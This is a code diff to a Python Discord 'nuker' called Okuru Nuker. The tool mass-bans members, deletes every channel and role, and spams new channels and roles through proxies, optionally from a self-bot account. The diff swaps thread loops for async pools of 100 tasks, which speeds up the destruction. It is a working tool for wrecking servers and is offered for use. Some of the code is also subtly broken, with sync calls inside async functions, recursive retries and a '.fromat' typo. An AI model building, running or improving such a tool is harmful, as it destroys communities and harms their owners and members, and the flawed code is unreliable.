@@ -66,7 +66,7 @@ elif token_type == 'bot':
 client = commands.Bot(command_prefix=config['General']['Prefix'], case_insensitive=True, self_bot=userBot, help_command=None)
 
 class NukeFunctions:
-    def BanUser(UserID: str) -> bool:
+    async def BanUser(UserID: str) -> bool:
         try:
             r = httpx.put(
                 'https://discord.com/api/{}/guilds/{}/bans/{}'.format(api, guild, UserID),
@@ -82,7 +82,7 @@ class NukeFunctions:
         except Exception as e:
             print(e)
             return(NukeFunctions.BanUser(UserID))
-    def DeleteChannel(ChannelID: str) -> bool:
+    async def DeleteChannel(ChannelID: str) -> bool:
         try:
             r = httpx.delete(
                 'https://discord.com/api/{}/channels/{}'.format(api, ChannelID),
@@ -99,7 +99,7 @@ class NukeFunctions:
         except:
             return(NukeFunctions.DeleteChannel(ChannelID))
         
-    def DeleteRole(RoleID: str):
+    async def DeleteRole(RoleID: str) -> bool:
         r = httpx.delete(
             'https://discord.com/api/{}/guilds/{}/roles/{}'.format(api, guild, RoleID),
             proxies=getProxyDict(),
@@ -222,33 +222,27 @@ async def menu():
     if choice == 1:
         util.cls(); util.setTitle('[Okuru Nuker] - Member Banning')
         util.log('[!]', 'Starting member ban.')
-        start = threading.active_threads()
-        for member in members:
-            threading.Thread(target=NukeFunctions.BanUser, args=(member,)).start()
-        while start < threading.active_count():
-            pass
+        with TaskPool(100) as pool:
+            for member in members:
+                await pool.put(NukeFunctions.BanUser(member))
         util.log('[!!!]', 'Finished, Press Enter to Continue.'); await menu()
 
 
     elif choice == 2:
         util.cls(); util.setTitle('[Okuru Nuker] - Channel Deletion')
         util.log('[!]', 'Starting Channel Deletion')
-        start = threading.active_threads()
-        for channel in channels:
-            threading.Thread(target=NukeFunctions.DeleteChannel, args=(channel, )).start()
-        while start < threading.active_count():
-            pass
+        with TaskPool(100) as pool:
+            for channel in channels:
+                await pool.put(NukeFunctions.DeleteChannel(channel))
         util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
 
 
     elif choice == 3:
         util.cls(); util.setTitle('[Okuru Nuker] - Role Deletion')
         util.log('[!]', 'Starting Role Deletion')
-        start = threading.active_count()
-        for role in roles:
-            threading.Thread(target=NukeFunctions.DeleteRole, args=(role, )).start()
-        while start < threading.active_count():
-            pass
+        with TaskPool(100) as pool:
+            for role in roles:
+                await pool.put(NukeFunctions.DeleteRole(role))
         util.log('[!!!]', 'Finished, Press Enter to Continue.'); input()
         await menu()
 
@@ -258,11 +252,9 @@ async def menu():
         util.log('[?]', 'Channel Amount: ', '')
         amount = input()
         util.log('[!]', 'Starting to Channel Creation')
-        start = threading.active_count()
-        for i in range(int(amount)):
-            threading.Thread(target=NukeFunctions.CreateChannel, args=(random.choice(ChannelNames), )).start()
-        while start < threading.active_count():
-            pass
+        with TaskPool(100) as pool:
+            for i in range(int(amount)):
+                await pool.put(NukeFunctions.CreateChannel, random.choice(ChannelNames))
         util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
 
 
@@ -273,11 +265,9 @@ async def menu():
         util.log('[!]', 'Got Names from Config.')
         util.log('[?]', 'Role Amount: ', end='')
         amount = input()
-        start = threading.active_count()
-        for i in range(int(amount)):
-            threading.Thread(target=NukeFunctions.CreateRole, args=(RoleNames,)).start()
-        while start < threading.active_count():
-            pass
+        with TaskPool(100) as pool:
+            for i in range(int(amount)):
+                await pool.put(NukeFunctions.CreateRole, random.choice(RoleNames))
         util.log('[!!!]', 'Finished, Press Enter to Continue.'); input(); await menu()
         await menu()
 
@@ -309,7 +299,7 @@ async def scrape(ctx):
     for item in ['members', 'channels', 'roles']:
         try:
             os.remove('Scraped/{}.okuru'.fromat(item))
-        except:
+        except Exception:
             pass
     ctx.guild.members; ctx.guild.channels; ctx.guild.roles
 
